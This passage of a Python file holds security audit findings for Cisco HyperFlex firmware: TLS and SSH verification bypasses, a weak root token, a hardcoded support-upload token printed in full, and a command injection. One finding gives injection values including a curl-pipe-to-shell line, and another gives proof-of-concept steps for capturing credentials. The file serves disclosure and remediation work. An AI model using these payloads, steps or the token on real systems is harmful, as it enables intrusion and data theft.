        "Chain: HX-F190 + HX-F178 (no audit) = undetected exfil of cluster intelligence",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict the `/support` path with `auth_basic` authentication requiring valid "
        "credentials before serving support bundle files. "
        "Alternatively, restrict to localhost: `allow 127.0.0.1; deny all`. "
        "If remote support access is needed, use the authenticated `/storfs-support` "
        "path (which does have auth_basic enabled) instead of `/support`."
    ),
    "tags": ["support-bundle", "auth-bypass", "nginx", "data-exfil", "cwe-284", "high"],
}


HX_F193 = {
    "id": "HX-F193",
    "title": "node_replace.py Globally Overrides ssl._create_default_https_context at Module Import",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-misc/hx-scripts/node_replace.py",
    "description": (
        "node_replace.py lines 37-44 override Python's default HTTPS context at module load: "
        "`ssl._create_default_https_context = ssl._create_unverified_context`. "
        "This is more severe than per-request `verify=False` (HX-F168): it globally disables "
        "TLS certificate verification for all HTTPS connections opened by this process, "
        "including any library or dependency that uses the default context. "
        "The script is responsible for node replacement operations — it connects to "
        "vCenter, cluster management IPs, ESX hosts, and remote controller VMs. "
        "Under this override, an on-path attacker can present any certificate and intercept "
        "credentials, commands, and cluster configuration data on all of these connections. "
        "The comment `# Handle target environment that doesn't support HTTPS verification` "
        "indicates this was intentionally introduced as an environment workaround, "
        "not detected and reverted."
    ),
    "evidence": [
        "node_replace.py line 37: _create_unverified_https_context = ssl._create_unverified_context",
        "node_replace.py line 44: ssl._create_default_https_context = _create_unverified_https_context",
        "Global override affects all HTTPS calls: checkLogin, getAbout, getControllers, clusterRefresh, getClusterDetails",
        "Comment: '# Handle target environment that doesn't support HTTPS verification'",
        "Script connects to vCenter (port 443), cluster management, ESX hosts, remote ctlvms",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the global ssl._create_default_https_context override. "
        "Install valid cluster CA certificates and configure requests with `verify=/path/to/ca.crt`. "
        "If self-signed certificates are in use, generate them with correct hostnames (see HX-F192) "
        "and distribute the CA to management scripts rather than bypassing verification."
    ),
    "tags": ["tls", "ssl-bypass", "global-override", "cwe-295", "high"],
}

HX_F194 = {
    "id": "HX-F194",
    "title": "SSH Host Key Verification Disabled via AutoAddPolicy in Node Management Scripts",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-misc/hx-scripts/node_replace.py, hx-scripts/install_vc_plugin.py",
    "description": (
        "Both node_replace.py and install_vc_plugin.py create paramiko SSH clients with "
        "`set_missing_host_key_policy(paramiko.AutoAddPolicy())`, silently accepting any "
        "host key on first connection without validation. "
        "node_replace.py uses this pattern at three call sites: "
        "`check_connection()` (line 237), `sshToHost()` (line 324), and inline at line 666. "
        "install_vc_plugin.py uses it in `check_connection()` (line 348) and `copy_file()` (line 355). "
        "The affected operations include: "
        "(1) root SSH access to cluster controller VMs during node replacement, "
        "(2) root SSH access to ESX hypervisor hosts, "
        "(3) SFTP transfer of the vCenter plugin ZIP to all cluster nodes as root. "
        "Under AutoAddPolicy, an on-path attacker can present a forged host key, "
        "intercept the root password, and receive the plugin ZIP — which is then deployed "
        "cluster-wide. Combined with the global TLS bypass (HX-F193), no SSH or HTTPS "
        "connection from these management scripts verifies peer identity."
    ),
    "evidence": [
        "node_replace.py line 237: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "node_replace.py line 324: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "node_replace.py line 666: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "install_vc_plugin.py line 348: ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "install_vc_plugin.py line 482: copy_file() uses SFTP as root to all cluster nodes",
        "Root credentials and plugin packages transmitted over unverified SSH sessions",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AutoAddPolicy with RejectPolicy or WarningPolicy. "
        "Pre-populate known_hosts with cluster node fingerprints during cluster setup. "
        "For SFTP plugin distribution, use an authenticated internal package repository "
        "over HTTPS rather than SCP/SFTP with ad-hoc host key acceptance."
    ),
    "tags": ["ssh", "host-key", "mitm", "cwe-295", "paramiko", "high"],
}

HX_F197 = {
    "id": "HX-F197",
    "title": "Root Session Token Generated with 15-bit Entropy ($RANDOM) and Stored World-Readable",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-330",
    "component": "storfs-misc/set_shared_key.sh",
    "description": (
        "set_shared_key.sh generates the `X-RootSessionID` authentication token used by "
        "stSSOMgr and all `useRootSessionId=True` API callers: "
        "`sharedkey=$nodeid-$RANDOM` where `nodeid` is read from "
        "`/opt/hyperflex/etc/product_uuid`. "
        "Bash `$RANDOM` generates integers in [0, 32767] — 15 bits of entropy, "
        "32,768 possible values total. The `product_uuid` is the VMware VM UUID, "
        "readable from BIOS data (`dmidecode -s system-uuid`) by any local user. "
        "An attacker with the product UUID can enumerate the full keyspace in under "
        "one second and obtain a valid `X-RootSessionID` token. "
        "The generated file is then made world-readable: `chmod 644 root_file.pub`. "
        "Any local user can read the token directly without brute-force. "
        "The token is placed at `/etc/root_file.pub` before `migrate-secureconfig.sh` "
        "moves it to `/etc/hyperflex/secure/root_file.pub`, meaning it is world-readable "
        "in `/etc/` first and potentially in the secure directory as well. "
        "The token is used with `X-RootSessionID` header in HTTP requests to the "
        "management API at `http://localhost:8000` — bypassing normal JWT authentication "
        "for certificate management, inventory, STIG settings, and cluster lifecycle "
        "operations. Affected callers: `nginxCertManager.py`, `synchronizeSyslog.py`, "
        "`schScripts.py`, `SLEvaluationJob.py`, `update-inventory.py`, `hsu_utils.py`, "
        "upgrade hook `5997_stig_setting_ESX.py`."
    ),
    "evidence": [
        "set_shared_key.sh line 11: sharedkey=$nodeid-$RANDOM (15-bit entropy)",
        "set_shared_key.sh line 13: chmod 644 $dest_folder/root_file.pub (world-readable)",
        "nodeid = product_uuid read from /opt/hyperflex/etc/product_uuid (VM UUID, derivable from dmidecode)",
        "StTransportBase.py line 26: X-RootSessionID loaded from /etc/hyperflex/secure/root_file.pub",
        "commonFunctions.py line 42: headers['X-RootSessionID'] = rootSessionId",
        "Token bypasses JWT auth for certificate, STIG, inventory, and cluster lifecycle APIs",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `$RANDOM` with a cryptographically secure random generator: "
        "`sharedkey=$(openssl rand -hex 32)`. "
        "Change the file permissions to 600 (root-only): `chmod 600 root_file.pub`. "
        "Ensure the migration script preserves restrictive permissions when moving the file "
        "to `/etc/hyperflex/secure/`. "
        "Consider replacing the file-based `X-RootSessionID` scheme with a time-limited "
        "token issued by the AAA service, eliminating the static shared secret entirely."
    ),
    "tags": ["weak-random", "world-readable-token", "authentication-bypass", "cwe-330", "cwe-732", "critical"],
}

HX_F198 = {
    "id": "HX-F198",
    "title": "On-Prem Artifact Downloads Bypass TLS and Verify Checksum Over Same Untrusted Channel",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
    "cwe": "CWE-354",
    "component": "storfs-deploy/ansible/roles/download/tasks/download-artifacts.yml",
    "description": (
        "download-artifacts.yml conditionally disables TLS verification for on-premises "
        "deployments: `Disable certificate verification for onprem deployment: set_fact: "
        "check_certs: no when: deployment_env == 'onprem'`. "
        "Both the artifact (`artifactUrl`) and its checksum (`checksumUrl`) are fetched "
        "with `validate_certs: '{{ check_certs }}'`. "
        "When `check_certs: no`, both the artifact and its integrity checksum are "
        "retrieved over the same MITM-susceptible channel. "
        "An on-path attacker can serve a trojanized artifact alongside a matching "
        "checksum file — the `get_url` `checksum:` parameter will verify that the "
        "artifact matches the attacker-provided checksum, confirming successful "
        "substitution rather than detecting it. "
        "This defeats the integrity verification entirely: the checksum confirms "
        "consistency between attacker-controlled data, not authenticity. "
        "The download role installs VIBs, packages, and catalog artifacts on all "
        "cluster ESX hosts. Successful MITM during on-prem deployment yields "
        "code execution on every node that processes the download role."
    ),
    "evidence": [
        "download-artifacts.yml: set_fact check_certs: no when: deployment_env == 'onprem'",
        "download-artifacts-internal.yml: get_url url={{ item.checksumUrl }} validate_certs={{ check_certs }}",
        "download-artifacts-internal.yml: get_url url={{ item.artifactUrl }} validate_certs={{ check_certs }} checksum={{ checksumType }}:{{ checksum_value.stdout }}",
        "Checksum fetched from same unverified TLS endpoint as artifact — MITM serves matching pair",
        "Artifacts installed as VIBs/packages on all cluster ESX hosts via download role",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the on-prem TLS bypass (`check_certs: no`). "
        "If on-prem environments lack externally-trusted CAs, distribute the HyperFlex "
        "cluster CA certificate to the ansible control node and configure `validate_certs: yes` "
        "with `ca_cert: /path/to/ca.crt`. "
        "The checksum file should be served from a separate, independently-authenticated "
        "channel (or signed with a known public key) rather than from the same download server. "
        "A signature verification step (GPG detached sig) after download provides stronger "
        "integrity than same-channel checksum alone."
    ),
    "tags": ["tls", "artifact-download", "checksum-bypass", "cwe-354", "ansible", "high"],
}

HX_F204 = {
    "id": "HX-F204",
    "title": "Factory OVA Deployment Disables Both TLS and OVF Package Verification via ovftool Flags",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
    "cwe": "CWE-354",
    "component": (
        "factory/opt/hyperflex/storfs-factory/ansible/library/deployOva.py / "
        "ovftool invocation"
    ),
    "description": (
        "deployOva.py constructs an ovftool command with both `--noSSLVerify` and "
        "`--disableVerification` flags for controller VM deployment during factory provisioning. "
        "The full ovftool invocation at line 71-73: "
        "`/usr/bin/ovftool --allowExtraConfig --acceptAllEulas --disableVerification "
        "--noSSLVerify --datastore=... vi://esxUserName:esxEncodedPassword@hostname`. "
        "`--noSSLVerify` disables TLS certificate verification for the ESXi connection, "
        "allowing MITM of the transport layer. "
        "`--disableVerification` disables OVF manifest, certificate, and checksum "
        "verification for the OVA package itself. "
        "Combined, an on-path attacker can intercept the factory deployment connection "
        "and substitute a trojanized controller VM OVA without detection. "
        "The controller VM is the HyperFlex storage controller — its compromise "
        "gives full access to the cluster's data path, encryption keys, and "
        "cluster management APIs from the first boot. "
        "The ESXi credentials are also embedded in the `vi://user:pass@host` URL "
        "passed as a CLI argument to ovftool, making them visible in "
        "`/proc/<pid>/cmdline` during deployment."
    ),
    "evidence": [
        "deployOva.py line 71-73: ovftool --allowExtraConfig --acceptAllEulas --disableVerification --noSSLVerify ... vi://user:pass@host",
        "--noSSLVerify: TLS cert verification disabled for ESXi connection",
        "--disableVerification: OVF manifest, cert, and checksum verification disabled",
        "vi://user:pass@host URL with credentials in process argument list",
        "Target: controller VM (HyperFlex storage controller) — cluster data-path root",
        "deployOva.py line 77: Popen(shlex.split(cmd), shell=False) — credentials in /proc/<pid>/cmdline",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove `--noSSLVerify` and `--disableVerification` from the ovftool invocation. "
        "For factory environments with self-signed ESXi certs, pre-distribute the "
        "factory CA certificate and configure ovftool's `--sslCertThumbprint` or "
        "`--sslCipherList` options rather than disabling verification entirely. "
        "Sign factory OVA packages with a Cisco-controlled private key and verify "
        "signatures at deployment time. "
        "Replace the `vi://user:pass@host` URL form with a credentials file approach "
        "or environment variable injection to avoid process table exposure."
    ),
    "tags": ["ovftool", "factory", "tls", "package-verification", "cwe-354", "cwe-295", "high"],
}

HX_F220 = {
    "id": "HX-F220",
    "title": "Hardcoded API Token Grants Unauthenticated Access to Cisco Support Upload Infrastructure",
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": ["CWE-798"],
    "component": "storfs-misc/hx-scripts/support.py",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "`support.py` contains a hardcoded API token for Cisco's HyperFlex support upload service "
        "at `upload.hyperflex.io`. The token and repository UUID are embedded as string literals "
        "in two functions (`createFolder` and `uploadSupportBundle`): "
        "`token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'` "
        "`repo UUID: 'be407e72-bbcb-41a7-bd0c-2fbdd3abfa74'`. "
        "The token is used as a Seafile API `Token` authorization header. "
        "The API URL pattern (`/admin/api2/repos/<UUID>/`) indicates admin-level repository access. "
        "Functions enabled by the token: "
        "(1) `createFolder`: creates arbitrary directories in the repository via `POST .../dir/?p=<path>`. "
        "(2) `uploadSupportBundle`: retrieves an upload link and uploads bundle archives. "
        "TLS verification is disabled for all `upload.hyperflex.io` requests "
        "(`verify=False` at lines 322, 369)."
    ),
    "evidence": [
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/hx-scripts/support.py",
            "lines": "313-322",
            "snippet": (
                "def createFolder(folderTag):\n"
                "    folder = '/' + folderTag\n"
                "    data = {'operation': 'mkdir'}\n"
                "    token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'\n"
                "    headers={'Authorization': 'Token {token}'.format(token=token), ...}\n"
                "    url = 'https://upload.hyperflex.io/admin/api2/repos/be407e72-bbcb-41a7-bd0c-2fbdd3abfa74/dir/?p={}'.format(folder)\n"
                "    r = requests.post(url, data=data, headers=headers, verify=False)"
            ),
            "note": "Hardcoded token; admin-level Seafile API; TLS verification disabled",
        },
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/hx-scripts/support.py",
            "lines": "360-374",
            "snippet": (
                "def uploadSupportBundle(fileName, folderTag, bundle):\n"
                "    token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'\n"
                "    headers={'Authorization': 'Token {token}'.format(token=token), ...}\n"
                "    url = 'https://upload.hyperflex.io/admin/api2/repos/be407e72-bbcb-41a7-bd0c-2fbdd3abfa74/upload-link/'\n"
                "    r = requests.get(url, headers=headers, verify=False)"
            ),
            "note": "Upload-link retrieval using same hardcoded token; bundles contain cluster credentials and configs",
        },
    ],
    "impact": (
        "Any party with access to the HXDP 6.0.2b firmware image (publicly distributed) can "
        "extract the token and use it to: "
        "(1) Create arbitrary directories on `upload.hyperflex.io`. "
        "(2) Upload arbitrary content to the Cisco support repository. "
        "(3) Potentially enumerate or download support bundles from other HyperFlex customers "
        "if the API token grants repository-wide read access. "
        "Support bundles contain cluster credentials, network topology, and potentially "
        "encryption key material. The `verify=False` flag prevents detection of MITM against "
        "the upload channel."
    ),
    "remediation": (
        "1. Rotate the hardcoded token immediately and invalidate it. "
        "2. Issue per-cluster or per-session upload tokens at the time of support bundle "
        "generation via an authenticated API call, never embed tokens in the firmware. "
        "3. Enable TLS certificate validation for all `upload.hyperflex.io` requests. "
        "4. Audit the Seafile repository for unauthorized uploads or access using the token."
    ),
    "tags": ["hardcoded-token", "external-service", "support", "seafile", "cwe-798", "critical"],
}

HX_F221 = {
    "id": "HX-F221",
    "title": "SSH Host Key Verification Disabled Globally in Ansible Configuration and Across Cluster Management Scripts",
    "severity": "HIGH",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": ["CWE-297"],
    "component": (
        "storfs-deploy/ansible/ansible.cfg + storfs-factory/ansible/ansible.cfg + "
        "addhost.yml + replaceNode.sh + setstaticip.py + scpFile.py + run-validate-hw.sh"
    ),
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "SSH host key verification is disabled across the entire Ansible-based cluster "
        "management and factory provisioning stack. Two global `ansible.cfg` files set "
        "`ssh_args = ... -o UserKnownHostsFile=/dev/null` as a default for all Ansible "
        "SSH connections, meaning no operation in the deploy or factory Ansible stack "
        "verifies the SSH host key of any remote target. "
        "The same pair `StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` appears "
        "explicitly in five additional scripts: "
        "`addhost.yml` (ESXi host addition to cluster), "
        "`replaceNode.sh` (node replacement, 3 occurrences), "
        "`setstaticip.py` (CIMC static IP configuration), "
        "`scpFile.py` (file transfer to cluster nodes), and "
        "`run-validate-hw.sh` (hardware validation, 2 occurrences). "
        "An attacker with a network-layer MITM position between the controller VM and any "
        "ESXi, CIMC, or cluster node target can intercept any of these SSH connections and "
        "present a fraudulent host key, receiving the transmitted credentials in plaintext."
    ),
    "evidence": [
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/ansible.cfg",
            "lines": "19",
            "snippet": "ssh_args = -o ServerAliveInterval=60 -o ControlMaster=auto -o ControlPersist=60s -o UserKnownHostsFile=/dev/null",
            "note": "Global deploy-phase setting; affects ALL Ansible SSH operations in storfs-deploy",
        },
        {
            "file": "factory/opt/hyperflex/storfs-factory/ansible/ansible.cfg",
            "lines": "19",
            "snippet": "ssh_args = -o ServerAliveInterval=60 -o ControlMaster=auto -o ControlPersist=60s -o UserKnownHostsFile=/dev/null",
            "note": "Global factory-phase setting; affects ALL Ansible SSH operations in storfs-factory",
        },
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/addhost.yml",
            "lines": "50",
            "snippet": "ansible_ssh_common_args='-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'",
            "note": "Used during ESXi host addition; propagates cluster-scope SSH credentials to potentially rogue host",
        },
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/replaceNode.sh",
            "lines": "159, 165, 176",
            "snippet": (
                "sshpass -p $PASSWD ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${USERNAME}@$ESXHOST $*\n"
                "sshpass -p $PASSWD scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $files ${USERNAME}@$ESXHOST:$dest"
            ),
            "note": "Node replacement script; also passes PASSWD as sshpass command-line argument",
        },
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/library/setstaticip.py",
            "lines": "61",
            "snippet": 'cmd = "ssh -l %s %s -oKexAlgorithms=... -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" % (cimc_user, cimc_addr)',
            "note": "CIMC (server management controller) configuration; allows MITM on BMC access",
        },
    ],
    "impact": (
        "An attacker with a network-layer MITM position can intercept any Ansible-managed SSH "
        "connection (deploy, factory provisioning, host addition, node replacement, hardware "
        "validation) and present a fraudulent server host key. The SSH client will silently "
        "accept the rogue key and transmit the authentication credential (password or key "
        "material) to the attacker. This affects the full lifecycle of cluster management: "
        "initial factory deployment, cluster expansion, node replacement, and hardware validation."
    ),
    "remediation": (
        "1. Remove `-o UserKnownHostsFile=/dev/null` from both `ansible.cfg` files; "
        "configure a proper known_hosts file with pre-populated host keys. "
        "2. For factory and provisioning operations where host keys are unknown, use host "
        "key scanning at network-layer setup time and populate known_hosts before enabling SSH. "
        "3. Remove `StrictHostKeyChecking=no` from all individual scripts; replace with "
        "`StrictHostKeyChecking=yes` and populate known_hosts during cluster configuration. "
        "4. At minimum, use TOFU (Trust On First Use) rather than permanent bypass."
    ),
    "tags": ["ssh", "host-key", "ansible", "mitm", "cwe-297", "high"],
}


for _f in [
    HX_F120,
    HX_F125,
    HX_F127,
    HX_F128,
    HX_F130,
    HX_F131,
    HX_F133,
    HX_F137,
    HX_F138,
    HX_F139,
    HX_F141,
    HX_F142,
    HX_F148,
    HX_F149,
    HX_F156,
    HX_F157,
    HX_F167,
    HX_F168,
    HX_F170,
    HX_F171,
    HX_F176,
    HX_F177,
    HX_F188,
    HX_F190,
    HX_F193,
    HX_F194,
    HX_F197,
    HX_F198,
    HX_F204,
    HX_F220,
    HX_F221,
]:
    FINDINGS[_f["id"]] = _f
HX_F227 = {
    "id": "HX-F227",
    "title": "Authenticated OS Command Injection via Unsanitized manifestFile Field in Support Bundle API",
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cwe": ["CWE-78"],
    "component": (
        "support-war/WEB-INF/classes/com/springpath/hx/support/impl/"
        "SupportbundleApiServiceImpl.java (compiled class), "
        "com/springpath/hx/support/impl/GenerationThread.java, "
        "com/springpath/hx/support/clients/HxSupportSvcClient.java"
    ),
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "The HyperFlex support bundle REST API endpoint "
        "`POST /supportBundle` accepts an `AsupCliConfiguration` JSON body with a "
        "`manifestFile` field. When `type` is `custom-asup` and `action` is "
        "`generate`, `SupportbundleApiServiceImpl.generateAndDeliverSupportBundle()` "
        "concatenates the caller-supplied `manifestFile` value directly into a shell "
        "command string using `StringConcatFactory.makeConcatWithConstants` "
        "(BootstrapMethods entry #12, constant template: "
        "`\"asupcli post --type custom-asup --manifestfile \\u0001\"`). "
        "No input validation, character filtering, or shell escaping is applied. "
        "The resulting command string is stored in a `GenerationThread` instance "
        "(`GenerationThread.cmd` field, constructor offset 11) and passed to "
        "`HxSupportSvcClient.executeCmd(cmd, nodeList)` at `run()` offset 174-180. "
        "`executeCmd` calls the Thrift service method "
        "`HxSupportSvc$Client.runCmdInAllVm(cmd, nodeList)` (bytecode offset 20), "
        "which dispatches the command string for execution on **all cluster VMs** "
        "via SSH. The `GenerationThread` polling loop contains the literal string "
        "`\"ps aux | grep '[a]supcli generate --type'\"` (run() offset 87), "
        "confirming the execution context is a shell that processes metacharacters. "
        "An authenticated HyperFlex management user can inject arbitrary shell "
        "commands by setting `manifestFile` to a value containing shell "
        "metacharacters (e.g., `foo; id`, `foo && curl http://x/s|sh`, backtick "
        "substitution). The injected command executes on every node in the cluster."
    ),
    "evidence": [
        {
            "file": "support-war: SupportbundleApiServiceImpl.class",
            "lines": "bytecode offsets 519-549",
            "snippet": (
                "// type == \"custom-asup\", manifestFile non-null and non-empty:\n"
                "519: ldc \"custom-asup\"\n"
                "523: invokevirtual String.equalsIgnoreCase\n"
                "529: aload 6           // manifestFile from AsupCliConfiguration\n"
                "534: invokevirtual String.length\n"
                "542: aload 6           // manifestFile (user-controlled)\n"
                "544: invokedynamic #200 // template: "
                "\"asupcli post --type custom-asup --manifestfile \\u0001\"\n"
                "549: astore 10         // cmd = template.replace(\\u0001, manifestFile)"
            ),
            "note": (
                "BootstrapMethods entry 12 constant: "
                "'asupcli post --type custom-asup --manifestfile \\u0001'; "
                "\\u0001 is replaced with the raw manifestFile string from the request body"
            ),
        },
        {
            "file": "support-war: GenerationThread.class",
            "lines": "run() bytecode offsets 171-183",
            "snippet": (
                "171: invokestatic HxSupportSvcClientFactory.getInstance()\n"
                "174: aload_0\n"
                "175: getfield cmd       // the injected command string\n"
                "178: aload 7            // nodeList\n"
                "180: invokevirtual HxSupportSvcClient.executeCmd(String, List)"
            ),
            "note": "cmd field set from constructor arg; flows from manifestFile with no transformation",
        },
        {
            "file": "support-war: HxSupportSvcClient.class",
            "lines": "executeCmd() bytecode offsets 14-22",
            "snippet": (
                "14: aload_0\n"
                "15: getfield cl        // HxSupportSvc$Client (Thrift)\n"
                "18: aload_1            // cmd (user-controlled)\n"
                "19: aload_2            // nodeList\n"
                "20: invokevirtual HxSupportSvc$Client.runCmdInAllVm(String, List)"
            ),
            "note": "Thrift call dispatches unsanitized command string to server-side runCmdInAllVm",
        },
        {
            "file": "support-war: GenerationThread.class",
            "lines": "run() bytecode offset 87",
            "snippet": (
                '87: ldc "ps aux | grep \'[a]supcli generate --type\'"'
            ),
            "note": (
                "Shell pipe in a literal string used for process polling confirms "
                "execution context is a POSIX shell; metacharacters in cmd are interpreted"
            ),
        },
    ],
    "impact": (
        "An authenticated HyperFlex management API user can execute arbitrary OS "
        "commands on every node in the HyperFlex cluster simultaneously by submitting "
        "a crafted `POST /supportBundle` request. The injected command runs in the "
        "security context of the HxSupportSvc Thrift service process on each cluster "
        "VM. Combined with the cluster-wide scope of `runCmdInAllVm`, a single "
        "authenticated request can achieve persistent access or data destruction "
        "across all cluster nodes. The support bundle API is accessible to any user "
        "with valid HyperFlex management credentials."
    ),
    "remediation": (
        "1. Pass `manifestFile` as a separate argument to `asupcli` via a string "
        "array (e.g., `ProcessBuilder(\"asupcli\", \"post\", \"--type\", "
        "\"custom-asup\", \"--manifestfile\", manifestFile)`) rather than "
        "concatenating it into a single command string passed to a shell. "
        "2. Apply a strict allowlist validation on `manifestFile` before use: "
        "permit only alphanumeric characters, hyphens, underscores, dots, and "
        "forward slashes; reject any value containing shell metacharacters. "
        "3. If shell execution is required, use `ProcessBuilder` with explicit "
        "`/bin/sh -c` and apply `ShellUtils.escapeShellArgument()` or equivalent "
        "quoting to the `manifestFile` value before interpolation."
    ),
    "tags": [
        "command-injection", "cwe-78", "authenticated", "rest-api",
        "support-bundle", "cluster-wide", "thrift", "high",
    ],
}


for _f in [HX_F227]:
    FINDINGS[_f["id"]] = _f
HX_F239 = {
    "id": "HX-F239",
    "title": "Global Python SSL Context Patched to Unverified in vcenter.py; Process-Wide TLS Bypass (CWE-295)",
    "severity": "MEDIUM",
    "cvss": "5.9",
    "component": "storfs-deploy/ansible/library/vcenter.py",
    "description": (
        "At line 389 of vcenter.py, the deployment module unconditionally replaces the "
        "global Python SSL context with an unverified context: "
        "ssl._create_default_https_context = ssl._create_unverified_context. "
        "This patch is applied once at module initialization and persists for the "
        "entire lifetime of the Python process. Unlike per-request verify=False which "
        "scopes the bypass to a single connection, this global patch disables TLS "
        "certificate verification for ALL HTTPS connections made by any code running "
        "in the same process after line 389 executes, including connections made by "
        "imported libraries. "
        "The vcenter.py module handles vCenter and ESXi credentials passed via Ansible "
        "module params (hostname, username, password, esxi_password — all base64-encoded). "
        "These credentials are passed to pyVmomi SmartConnect calls at lines 414, 422, "
        "426, 429, 432 under the now-unverified SSL context. An attacker positioned on "
        "the management network can intercept the HTTPS handshake with a rogue vCenter "
        "or ESXi certificate and receive plaintext vCenter administrator credentials "
        "before authentication completes. "
        "The patch is wrapped in try/except pass (lines 389-391) which silently swallows "
        "any error during the patch — if the patch fails, code proceeds as if TLS is "
        "verified while it may not be."
    ),
    "affected_versions": "HXDP 6.0.2b (all supported platforms)",
    "poc": (
        "ARP-spoof or DNS-redirect vcenter_hostname to attacker-controlled host "
        "with a self-signed cert. Run the vcenter Ansible module (used during "
        "cluster deployment). Observe that SmartConnect completes without "
        "certificate error and vCenter credentials are captured in the TLS session."
    ),
    "remediation": (
        "Remove ssl._create_default_https_context = ssl._create_unverified_context. "
        "If self-signed certificates are required, scope the unverified context to "
        "the specific SmartConnect call by passing sslContext=ssl._create_unverified_context() "
        "to the individual pyVmomi connection, not the global default. "
        "For production vCenter deployments, install a CA-signed certificate and pass "
        "the CA bundle path rather than disabling verification entirely."
    ),
    "references": [
        "CWE-295: Improper Certificate Validation",
        "vcenter.py line 389: ssl._create_default_https_context = ssl._create_unverified_context",
    ],
    "tags": [
        "tls-bypass", "cwe-295", "ssl-global-patch", "vcenter",
        "credential-interception", "deployment", "medium",
    ],
}


for _f in [
    HX_F239,
]:
    FINDINGS[_f["id"]] = _f
HX_F240 = {
    "id": "HX-F240",
    "title": "OVA Deployment Disables Signature Verification and TLS; ESXi Password Exposed in Process Cmdline (CWE-347, CWE-214)",
    "severity": "HIGH",
    "cvss": "7.4",
    "component": "storfs-deploy/ansible/library/deployOva.py",
    "description": (
        "The deployOva.py Ansible module deploys the HyperFlex storage controller VM "
        "(stCtlVM) OVA to ESXi hosts during cluster initialization. "
        "The ovftool invocation at lines 71-78 passes two security-disabling flags: "
        "(1) --noSSLVerify: TLS certificate verification is disabled for the ESXi "
        "connection used to upload the OVA. "
        "(2) --disableVerification: OVA digital signature verification is disabled, "
        "meaning the authenticity and integrity of the deployed VM image are never checked. "
        "The combination allows a man-in-the-middle on the management network to "
        "substitute a malicious OVA during deployment and have it accepted unconditionally "
        "as the storage controller VM. "
        "Additionally, the ESXi authentication credentials are passed in the ovftool "
        "command-line URL as: vi://<esxUserName>:<esxEncodedPassword>@<hostname>. "
        "This password is visible in /proc/pid/cmdline while ovftool runs, exposing "
        "the ESXi host administrator password to any process that can read /proc. "
        "The OVA source location (ovalocation) comes from Ansible module params and "
        "may be an HTTPS URL; under --noSSLVerify, this URL is fetched without TLS "
        "certificate validation, further enabling OVA source substitution."
    ),
    "affected_versions": "HXDP 6.0.2b (all supported platforms)",
    "poc": (
        "1. ARP-spoof or DNS-redirect the ESXi hostname to attacker host. "
        "2. Serve a malicious OVA from that host. "
        "3. ovftool accepts the self-signed cert (--noSSLVerify) and does not verify "
        "the OVA signature (--disableVerification). Malicious stCtlVM deployed. "
        "4. Read /proc/$(pgrep ovftool)/cmdline during deployment to extract ESXi password."
    ),
    "remediation": (
        "Remove --disableVerification and --noSSLVerify from the ovftool invocation. "
        "Install a CA-signed certificate on ESXi hosts or pin the expected thumbprint. "
        "Replace the vi://user:pass@host URL form with environment variable or stdin "
        "credential injection to prevent cmdline password exposure (CWE-214). "
        "Sign OVA images with Cisco's signing key and enforce signature verification "
        "during deployment."
    ),
    "references": [
        "CWE-347: Improper Verification of Cryptographic Signature",
        "CWE-214: Invocation of Process Using Visible Sensitive Information",
        "deployOva.py lines 71-78: --noSSLVerify, --disableVerification, vi://user:pass@host",
    ],
    "tags": [
        "ova-deployment", "cwe-347", "cwe-214", "ovftool", "no-ssl-verify",
        "disable-verification", "password-in-cmdline", "esxi", "high",
    ],
}


for _f in [
    HX_F240,
]:
    FINDINGS[_f["id"]] = _f
HX_F249 = {
    "id": "HX-F249",
